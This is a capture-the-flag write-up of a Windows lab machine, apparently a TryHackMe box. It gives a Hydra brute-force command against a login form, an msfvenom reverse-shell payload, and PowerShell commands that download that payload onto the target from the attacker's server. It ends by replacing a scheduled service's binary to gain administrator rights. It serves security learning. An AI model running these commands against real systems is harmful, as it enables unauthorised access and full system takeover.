## Recon
 
Begin recon with NMAP to see which ports are open on the box
 
 ![image](https://user-images.githubusercontent.com/88425510/215881658-a6e4f83f-dab3-4642-882e-db8aa872ad88.png)
 
NMAP shows that port 80 is open, suggesting there is a webpage being hosted by this machine.
 
Enumerate the webpage using GOBUSTER
 
 ![image](https://user-images.githubusercontent.com/88425510/215881709-65b0567b-80a4-491b-8bd6-7537a574485b.png)
![image](https://user-images.githubusercontent.com/88425510/215881730-2db10926-5a98-41bc-807a-153e028f5312.png)

 
This shows a number of places to check - note robots.txt
 
Visit robots.txt to see if there is any useful information available
 
 ![image](https://user-images.githubusercontent.com/88425510/215881777-52aa1b05-3f38-4d5a-a2e7-f280cae8b0a3.png)
 
Account looks promising
 
Navigate to account to see what we have

 ![image](https://user-images.githubusercontent.com/88425510/215881821-b08fe4fc-aa3e-49e8-adc5-f0c27d377852.png)
 
Note the default credentials seems to be admin:admin - this does not work so we will use admin as the username and attempt to bruteforce the password
 
## Foothold
 
Attempt a login and capture it with Burpsuite to gain information needed to form the Hydra attack
 
 ![image](https://user-images.githubusercontent.com/88425510/215881899-15f4d0b0-8f35-4b27-8548-ee7e26685e85.png)

Lines 1 and 14 are needed
Take these parts from Burp and the webpage to create Hydra command:
 
 ![image](https://user-images.githubusercontent.com/88425510/215881925-d88e0953-f22b-4f85-846c-9ef155e7f23b.png)
![image](https://user-images.githubusercontent.com/88425510/215881971-e7bd79f6-3201-4100-8438-7c7f1b09c86e.png)

 ![image](https://user-images.githubusercontent.com/88425510/215882009-6bae3aca-fdd6-4a1c-ab96-15472ce2a9f8.png)
 
Login failed
 
 
 
Combine the failed login message and the POST and VIEWSTATE fields to create the Hydra attack:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.176.34 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=VwAXG6ABUHHdsZyp9V5Zfa%2FQmIafRzp9ILoXJGVuXK8nUhCHtDfc4cAUkNeYybCBgFS7ttIKN9%2BL1TZYt9wc7ImbzKDO42jKqT4NzM2iK4qGYFdI5l7pg9jiSeKSYGI82ymoCvW67UVtpc1TE%2B1wg%2FuUJT23Wobx8ck39wYrMVKKYXRX&__EVENTVALIDATION=3FvnxLCU1vf%2FftSD5m08pwViCr63XR1GLrEKqv2qr42Hq8JQp2LWRA97rKzv1QZ1I8etW3igopbcuFlAq9be8kEAzsR5lfswhZLzLPLpwJrudjeGAiqRUNtpYvd2OfVPGKlinHl3CuVaVXXWfMEWJuKroB6hY9%2BlMqRgvnn3xhT%2Bzmv0&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```
 
Note: ^USER^ and ^PASS^ must be used to use the username and password list
 
 ![image](https://user-images.githubusercontent.com/88425510/215882113-324e4abe-518a-449f-8c45-e0f952c262be.png)
 
Attack successful
 
## ID vulns
 
Login with the stolen credentials and then learn about the system
 
![image](https://user-images.githubusercontent.com/88425510/215882190-e03adfd8-a2b5-4960-a267-8d7aa68121fc.png)

See what verstion, google and search exploit-DB
 
https://www.exploit-db.com/exploits/46353
 
 ![image](https://user-images.githubusercontent.com/88425510/215882217-23cc0115-51f0-4bc4-a49d-14b67cc76c33.png)
  
Download and configure the exploit, remove bloat at the start and put attackbox info in socket
 
 ![image](https://user-images.githubusercontent.com/88425510/215882296-f7baf7c8-f18f-48f4-8131-ecd13176372f.png)
 
Attack box netcat listener on same port used in exploit
 
 ![image](https://user-images.githubusercontent.com/88425510/215882328-bdf896a3-ef24-4ec8-8efb-6553ec9f2ebe.png)
 
Exploit-DB how to use exploit
 
 
 
Upload the exploit
 
 ![image](https://user-images.githubusercontent.com/88425510/215882417-52ceb1cc-2a97-402d-b84d-61347262061b.png)
 
 ![image](https://user-images.githubusercontent.com/88425510/215882448-032138fc-2a4c-4630-8ca6-cabcb4ccb34b.png)

Shell popped
 
## Shell stabilisation
 
 ![image](https://user-images.githubusercontent.com/88425510/215882481-9478302a-342f-4027-9dc8-fde50b57699b.png)
 
Some on box enumeration
 
Going to stabilise the shell with a meterpreter shell as it crashed a couple of times:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.87.68 LPORT=9001 -f exe > shell.exe
```
 
 ![image](https://user-images.githubusercontent.com/88425510/215882523-b58d6d30-3d0d-46b9-b2b0-34b40caa3b29.png)

```
python3 -m http.server
```
 
 ![image](https://user-images.githubusercontent.com/88425510/215882566-9695fa26-79fa-4485-9a78-8193fb73cee9.png)

Host a simple http server
 
On the target machine navigate to world writable location:
 
 ![image](https://user-images.githubusercontent.com/88425510/215882597-dd339976-c182-40c6-b7d6-0bcfa276baee.png)

```
powershell -c "Invoke-WebRequest -Uri 'http://10.10.87.68:8000/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"
```

 ![image](https://user-images.githubusercontent.com/88425510/215882617-7a1dde73-7049-46a0-bb08-2016abe78e51.png)

Use powershell to pull the meterpreter shell over
 
## Get meterpreter shell
 
Open metasploit on attack box and set up a multi/handler
Note - 
set payload windows/meterpreter/reverse_tcp
Set lport to port used in msfvenom payload
Set lhosts to attack box
 
 ![image](https://user-images.githubusercontent.com/88425510/215882673-aa04534b-b6f3-4d1f-8f59-d36540e7d871.png)

Running shell.exe on target machine and getting session on metasploit
 
 
## On host enumeration
 
Upload winPEAS
 
 ![image](https://user-images.githubusercontent.com/88425510/215882711-ef262bed-e2ba-4e3a-a35c-88f3020b002d.png)

Attack box hosing simple python server

![image](https://user-images.githubusercontent.com/88425510/215882739-5ebee602-d7d0-475a-8677-1905a7606000.png)

```
powershell -c "Invoke-WebRequest -Uri 'http://10.10.189.26:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
```
 
Using powershell to get winPEAS
 
In Shell:
 
.\winPEAS.bat
 
In order to actually read the winPEAS output I had to pipe it to a .txt file and download it. I think this is something to do with the buffer/ terminal memory on the attack box. Something to look in to again.
The output shows that WindowsScheduler is running, this can often be abused
 
In order to read the output:
```
.\winPEAS.bat > winpeas.txt
Download winpeas.txt
Less winpeas.txt
```
 
 
Having the below service running means something is scheduled:
 
![image](https://user-images.githubusercontent.com/88425510/215882826-3e8b1128-cd5a-4023-acd2-193c3585b611.png)

Navigate to program filex x86 \systemscheduler \events
you can see what is being run
 
![image](https://user-images.githubusercontent.com/88425510/215882884-a5083080-3c5c-439b-a1d6-51c4e86e45e0.png)

![image](https://user-images.githubusercontent.com/88425510/215882932-c52f25ff-c24e-4e7b-882a-538f68bc4d71.png)

![image](https://user-images.githubusercontent.com/88425510/215882954-34f78cef-6519-40a0-8c53-22523b14c788.png)
 
We can replace message.exe with our shell.exe and as it is being run as administrator this will elevate our privileges
For some reason on this box you cannot copy it and so will have to download it as before
 
Get shell.exe into systemscheduler:

```
powershell -c "Invoke-WebRequest -Uri 'http://10.10.189.26:8000/shell.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\shell.exe'"
```

Exploit service:
 
![image](https://user-images.githubusercontent.com/88425510/215883005-a2d10dab-6ea2-432c-bcef-086b9235c831.png)
![image](https://user-images.githubusercontent.com/88425510/215883032-6c0d9df9-7fe6-4c8b-934d-8dae7ff38517.png)
![image](https://user-images.githubusercontent.com/88425510/215883049-6d25a5c3-54a4-4ebd-a383-d8e923ac668b.png)

 
Replace message.exe with shell.exe
 
Note, this creates a session every 30 secons when the service runs so stop handler after you have one
 
## Getting flags:
 
Session 2 gives admin session

![image](https://user-images.githubusercontent.com/88425510/215883109-c73902f7-0ac3-4573-a72a-0364e012f6fc.png)
 
Look around for flags, both were on respective users desktops

![image](https://user-images.githubusercontent.com/88425510/215883160-72ec04fd-d7fe-400f-9a1d-da4e677e0443.png)

![image](https://user-images.githubusercontent.com/88425510/215883202-02915721-c309-4912-9770-51ec57eef056.png)

![image](https://user-images.githubusercontent.com/88425510/215883220-ed5c6814-8bae-4d6e-a7d9-10e19094f723.png)
 
Answer to one of the questions
 
## Final thoughts
 
This was an enjoyable box. I followed along the video on THM for the priv esc stuff. 
It took a long time for me to craft the Hydra command correctly, I spent a good 30 mins waiting and then got a load of false positives, then recrafted the command and got it right. 
The winPEAS scrolling problem is something I need to look back into, I've had it before on other machines and did find a fix previously but cannot remember what it was, although saving outputs is a useful thing to do. 
 

